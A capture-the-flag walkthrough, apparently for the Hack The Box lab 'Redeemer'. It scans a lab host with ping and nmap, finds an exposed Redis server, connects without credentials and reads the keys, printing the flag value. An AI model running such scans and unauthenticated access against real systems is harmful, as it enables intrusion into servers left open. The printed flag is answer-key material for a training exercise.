# Redeemer

* Use ***ping*** to check if the host is up.
```bash
$ ping 10.129.57.87 -c 1
PING 10.129.57.87 (10.129.57.87) 56(84) bytes of data.
64 bytes from 10.129.57.87: icmp_seq=1 ttl=63 time=9.36 ms

--- 10.129.57.87 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 9.355/9.355/9.355/0.000 ms
```

* Run an ***nmap*** scan on the top 1000 ports.
```bash
$ sudo nmap -A 10.129.57.87
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 00:15 EST
Nmap scan report for 10.129.57.87
Host is up (0.017s latency).
All 1000 scanned ports on 10.129.57.87 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   15.81 ms 10.10.14.1
2   17.24 ms 10.129.57.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
```

* Run a concurrent ***nmap*** scan on all ports.
```bash
$ sudo nmap -A 10.129.57.87 -p- -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 01:34 EST
Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 01:35 (0:00:00 remaining)
Nmap scan report for 10.129.57.87
Host is up (0.030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/30%OT=6379%CT=1%CU=36197%PV=Y%DS=2%DC=T%G=Y%TM=6386
OS:F9CE%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7
OS:%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W
OS:2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NN
OS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   14.06 ms 10.10.14.1
2   14.19 ms 10.129.57.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.48 seconds
```

* Install the ***redis-tools*** package.
```bash
$ sudo apt-get install redis-tools
```

* Connect to the ***Redis*** server without credentials.
```bash
$ redis-cli -h 10.129.57.87
```

* List all keys on the ***Redis*** server.
```bash
10.129.57.87:6379> KEYS *
1) "numb"
2) "temp"
3) "flag"
4) "stor"
```

* Get the value of the flag key.
```bash
10.129.57.87:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```
